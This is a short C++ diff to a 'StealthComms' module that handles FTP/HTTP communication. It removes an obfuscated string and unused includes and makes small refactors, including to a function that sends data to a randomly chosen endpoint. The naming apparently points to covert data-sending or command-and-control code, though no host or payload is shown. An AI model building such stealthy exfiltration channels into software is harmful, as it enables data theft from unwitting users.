@@ -4,9 +4,7 @@
 #include "communication/FtpComms.h"
 #include "core/Logger.h"
 #include "core/Configuration.h"
-#include "security/Obfuscation.h"
 #include "utils/TimeUtils.h"
-#include "utils/DataUtils.h"
 #include "utils/StringUtils.h"
 #include "utils/SystemUtils.h"
 #include "core/Platform.h"
@@ -21,8 +19,6 @@
 #include <wininet.h>
 #pragma comment(lib, "wininet.lib")
 #endif
-
-static const auto OBF_STEALTH_COMMS = OBFUSCATE("StealthComms");
 
 // Method reliability tracking
 static std::map<std::string, double> s_methodReliability = {
@@ -43,7 +39,7 @@ StealthComms::StealthComms(Configuration* config)
 }
 
 StealthComms::~StealthComms() {
-    Cleanup();
+    StealthComms::Cleanup();
 }
 
 bool StealthComms::Initialize() {
@@ -199,7 +195,7 @@ bool StealthComms::SendViaHTTP(const std::vector<uint8_t>& data) {
     std::random_device rd;
     std::mt19937 gen(rd());
     std::uniform_int_distribution<> dist(0, endpoints.size() - 1);
-    std::string endpoint = endpoints[dist(gen)];
+    const std::string& endpoint = endpoints[dist(gen)];
     
     return SendHttpRequest(endpoint, data);
 }
